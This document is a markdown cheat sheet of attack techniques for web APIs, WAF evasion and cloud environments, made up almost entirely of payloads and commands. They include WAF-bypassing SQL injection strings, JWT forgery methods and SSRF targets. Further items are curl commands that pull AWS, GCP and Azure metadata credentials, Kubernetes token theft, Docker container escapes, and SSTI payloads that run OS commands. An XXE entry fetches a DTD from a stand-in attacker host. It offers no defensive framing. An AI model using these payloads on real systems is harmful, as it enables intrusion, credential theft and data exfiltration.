# WAF Bypass & API Security & Cloud Exploitation — Complete Guide
## Last Updated: 2026-07-10

## OWASP API Security Top 10 (2023)

### API1: Broken Object Level Authorization (BOLA/IDOR)
```
Attack: Change object ID in request to access another user's data
Example: GET /api/users/123/orders → GET /api/users/456/orders
Tools: Burp Intruder, ffuf, manual testing
Bypass: UUID prediction, sequential IDs, base64-encoded IDs
```

### API2: Broken Authentication
```
Attack: Weak JWT, no rate limit, credential stuffing
JWT attacks:
- alg:none: {"alg":"none"} → no signature verification
- Weak secret: jwt_tool token -C -d rockyou.txt
- Algorithm confusion: RS256→HS256 with public key
- Kid injection: {"kid":"../../../../dev/null"}
- JWK injection: inject own RSA key
Rate limit bypass: X-Forwarded-For rotation, IP rotation
```

### API3: Broken Object Property Level Authorization
```
Attack: Mass assignment, excessive data exposure
Example: POST /api/users {"role":"admin","isAdmin":true}
Example: API returns all fields including password_hash
Bypass: Add unexpected fields, change field values
```

### API4: Unrestricted Resource Consumption
```
Attack: No rate limiting, no pagination limits
Example: GET /api/users?limit=999999 → dump all users
Example: POST /api/login (brute force without limit)
Bypass: Parallel requests, batch operations
```

### API5: Broken Function Level Authorization
```
Attack: Access admin functions as regular user
Example: GET /api/admin/users (no admin check)
Example: DELETE /api/users/123 (no ownership check)
Bypass: Change HTTP method, add admin headers
```

### API6: Unrestricted Access to Sensitive Business Flows
```
Attack: Automate business logic abuse
Example: Mass ticket buying, mass account creation
Example: Race condition in limited stock items
Bypass: Bot detection bypass, CAPTCHA bypass
```

### API7: Server Side Request Forgery (SSRF)
```
Attack: API fetches user-supplied URL
Payloads:
- http://169.254.169.254/latest/meta-data/ (AWS)
- http://metadata.google.internal/ (GCP)
- http://169.254.169.254/metadata/instance (Azure)
- file:///etc/passwd
- gopher://127.0.0.1:6379/_ (Redis)
Bypass: URL parser confusion, DNS rebinding, redirect chains
```

### API8: Security Misconfiguration
```
Attack: Default configs, verbose errors, CORS misconfig
Check: CORS: Access-Control-Allow-Origin: * (or reflection)
Check: Verbose error messages (stack traces, DB errors)
Check: Debug endpoints exposed (/debug, /actuator, /swagger)
Check: Default credentials
```

### API9: Improper Inventory Management
```
Attack: Old API versions still accessible
Example: /api/v1/admin (deprecated, no auth) vs /api/v2/admin (new, with auth)
Check: /api/v1, /api/v2, /api/v3, /api/internal, /api/debug
Check: Swagger/OpenAPI docs exposed
```

### API10: Unsafe Consumption of APIs
```
Attack: Third-party API data trusted without validation
Example: Webhook from third-party → no signature verification
Example: OAuth redirect_uri not validated
Bypass: Manipulate third-party response, redirect chain
```

## WAF Bypass Techniques — 30+ Methods

### 1. Encoding Bypass
```bash
# URL encoding
?id=1%27%20OR%20%271%27%3D%271

# Double URL encoding
?id=1%2527%2520OR%2520%25271%2527%253D%25271

# Unicode encoding
?id=1%u0027%20OR%20%u00271%u0027%3D%u00271

# HTML entity encoding
?id=1' OR '1'='1 (use &#39; for ')

# Base64
?id=JyBPUiAnMSc9JzE=

# Hex encoding
?id=0x3127204f52202731273d2731
```

### 2. Case Variation
```bash
?id=1' Or '1'='1
?id=1' oR '1'='1
?id=1' UNION select 1,2,3--
?id=1' uNiOn SeLeCt 1,2,3--
```

### 3. Comment Injection
```bash
?id=1'/**/OR/**/1=1--
?id=1'/*!OR*//*!1=1*/--
?id=1'/*!50000OR*/1=1--
?id=1'/*!UNION*//*!SELECT*/1,2,3--
?id=1'OR(1)=(1)--
?id=1'OR+1=1--
```

### 4. HTTP Header Injection
```bash
# SQLi via headers
curl -H "X-Forwarded-For: 1' OR '1'='1" target
curl -H "User-Agent: 1' OR SLEEP(5)--" target
curl -H "Referer: 1' UNION SELECT 1,2,3--" target
curl -H "Cookie: session=1' OR '1'='1" target

# Command injection via headers
curl -H "User-Agent: ;id" target
curl -H "X-Forwarded-For: |id" target
```

### 5. HTTP Method Confusion
```bash
# Try different methods
curl -X GET target/admin
curl -X POST target/admin
curl -X PUT target/admin
curl -X DELETE target/admin
curl -X PATCH target/admin
curl -X OPTIONS target/admin
curl -X TRACE target/admin

# Method override headers
curl -H "X-HTTP-Method-Override: DELETE" -X POST target/api/resource
curl -H "X-HTTP-Method: PUT" -X POST target/api/resource
```

### 6. Content-Type Switching
```bash
# Switch between content types
curl -H "Content-Type: application/json" -d '{"id":"1'\'' OR 1=1--"}' target
curl -H "Content-Type: application/xml" -d '<?xml?><id>1 OR 1=1</id>' target
curl -H "Content-Type: text/plain" -d "id=1' OR 1=1--" target
curl -H "Content-Type: multipart/form-data" -F "id=1' OR 1=1--" target
```

### 7. Chunked Encoding
```bash
# Transfer-Encoding: chunked
curl -H "Transfer-Encoding: chunked" -d "5\r\nid=1'\r\n6\r\nOR 1=1\r\n0\r\n" target
```

### 8. Parameter Pollution
```bash
?id=1&id=1' OR '1'='1 (server takes last)
?id=1' OR '1'='1&id=1 (server takes first)
?id=1 UNION&id=SELECT 1,2,3-- (split payload)
```

### 9. Wildcard Bypass
```bash
?id=1' OR 1=1-- (blocked)
?id=1' OR 2>1-- (bypass)
?id=1' || 1=1-- (bypass)
?id=1' && 1=1-- (bypass)
?id=1' %7C%7C 1=1-- (URL encoded ||)
```

### 10. Space Bypass
```bash
?id=1'%09OR%091=1-- (tab)
?id=1'%0aOR%0a1=1-- (newline)
?id=1'%0bOR%0b1=1-- (vertical tab)
?id=1'%0cOR%0c1=1-- (form feed)
?id=1'%0dOR%0d1=1-- (carriage return)
?id=1'%a0OR%a01=1-- (non-breaking space)
?id=1'/**/OR/**/1=1-- (comment)
?id=1'++OR++1=1-- (+ = space in URL)
```

### 11. WAF-Specific Bypass
```bash
# Cloudflare
?id=1' /*!50000OR*/ 1=1--
?id=1' /*!UNION*/ /*!SELECT*/ 1,2,3--

# ModSecurity
?id=1' OR 1=1--+ (MSSQL comment)
?id=1' OR 1=1# (MySQL comment)

# AWS WAF
?id=1' OR 1=1 OR ''='
?id=1' OR 1=1 LIMIT 1--

# Akamai
?id=1' OR 1=1 OR ''='
?id=-1 UNION SELECT 1,2,3--
```

### 12. JSON WAF Bypass
```bash
# Send SQLi in JSON
curl -H "Content-Type: application/json" \
  -d '{"query":"SELECT * FROM users WHERE id=1 OR 1=1"}' target/api

# Nested JSON
curl -d '{"filter":{"id":"1 OR 1=1"}}' target/api
```

### 13. Unicode Normalization Bypass
```bash
# Full-width characters
?id=１' ＯＲ １=１--

# Unicode overlong
?id=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

# Homoglyphs (similar looking chars)
?id=1' 0R 1=1-- (0 instead of O)
```

### 14. IP Rotation for Rate Limit Bypass
```bash
# Rotate X-Forwarded-For
for i in {1..1000}; do
  curl -H "X-Forwarded-For: $((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))" target/login
done

# Rotate via proxy
curl --proxy socks5://proxy:port target
```

### 15. HTTP/2 Bypass
```bash
# Some WAFs don't inspect HTTP/2 properly
curl --http2 -H "X-Forwarded-For: 1' OR 1=1--" target
```

## Cloud Exploitation Techniques

### AWS
```bash
# S3 bucket enumeration
aws s3 ls s3://bucket-name
aws s3 cp s3://bucket-name/key /tmp/
aws s3 sync s3://bucket-name /tmp/bucket

# S3 public access check
curl -sk http://bucket-name.s3.amazonaws.com
curl -sk http://bucket-name.s3.amazonaws.com?list-type=2

# Metadata (IMDSv1)
curl -sk http://169.254.169.254/latest/meta-data/
curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -sk http://169.254.169.254/latest/user-data/

# Metadata (IMDSv2)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/

# Lambda environment
env | grep AWS_
env | grep SECRET_
env | grep DB_
```

### GCP
```bash
# Metadata
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/

# Service account token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Project info
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/project-id

# GCS bucket
curl -sk http://storage.googleapis.com/bucket-name/
```

### Azure
```bash
# Metadata
curl -H "Metadata: true" \
  http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Access token
curl -H "Metadata: true" \
  http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Blob storage
curl -sk http://account.blob.core.windows.net/container
```

### Kubernetes
```bash
# Service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# API server
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/secrets

# Kubelet API
curl -sk https://node:10250/pods

# etcd
curl -sk http://127.0.0.1:2379/version
```

### Docker
```bash
# Docker socket
curl --unix-socket /var/run/docker.sock http://v1.41/containers/json

# Container escape
docker run -it --privileged ubuntu sh
docker run -v /:/host ubuntu chroot /host

# Registry
curl -sk http://registry:5000/v2/_catalog
curl -sk http://registry:5000/v2/image/tags/list
```

## Advanced Injection Techniques

### GraphQL
```bash
# Introspection
{"query":"{__schema{types{name,fields{name,type{name}}}}}"}

# Batching (rate limit bypass)
{"query":"{a:user(id:1){id,name,email},b:user(id:2){id,name,email}}"}

# SQLi via GraphQL
{"query":"{user(id:\"1' OR '1'='1\"){name}}"}

# CSRF via GraphQL
# Send GET request with Cookie, no Content-Type needed
```

### gRPC
```bash
# Reflection
grpcurl -plaintext target:8080 list
grpcurl -plaintext target:8080 describe service.Method

# Call method
grpcurl -plaintext -d '{"id": "1 OR 1=1"}' target:8080 service.Method
```

### WebSocket
```bash
# Connect
wscat -c ws://target/ws

# SQLi via WebSocket
{"message":"1' OR '1'='1"}
{"query":"SELECT * FROM users"}

# Command injection
{"cmd":"id"}
{"command":"cat /etc/passwd"}
```

### Server-Sent Events (SSE)
```bash
# Connect
curl -sk target/events -H "Accept: text/event-stream"

# Inject via event data
curl -sk -X POST target/events -d "data: 1' OR '1'='1"
```

## Race Condition Exploitation
```bash
# Parallel requests for race condition
for i in {1..100}; do
  curl -sk -X POST target/api/redeem -d "code=FREE100" &
done
wait

# Use async Python
python3 << 'PYEOF'
import asyncio, aiohttp

async def exploit():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(100):
            tasks.append(session.post('http://target/api/transfer', json={'amount': 1000}))
        await asyncio.gather(*tasks)

asyncio.run(exploit())
PYEOF
```

## Prototype Pollution (Node.js)
```bash
# JSON body
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}

# URL parameter
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true

# Cookie
{"__proto__":{"role":"admin"}}
```

## SSTI Payloads (All Engines)
```bash
# Jinja2 (Python/Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP/Symfony)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Velocity (Java)
#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("id"))

# ERB (Ruby)
<%=system("id")%>
<%=`id`%>

# Pug/Jade (Node)
#{global.process.mainModule.require('child_process').execSync('id')}

# Nunjucks (Node)
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

## XXE Payloads
```bash
# Basic file read
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>

# Blind XXE (OOB)
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker/xxe.dtd">%remote;]><root>&send;</root>

# XXE via SVG
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>

# XXE via DOCX
# Modify word/document.xml with XXE payload
```
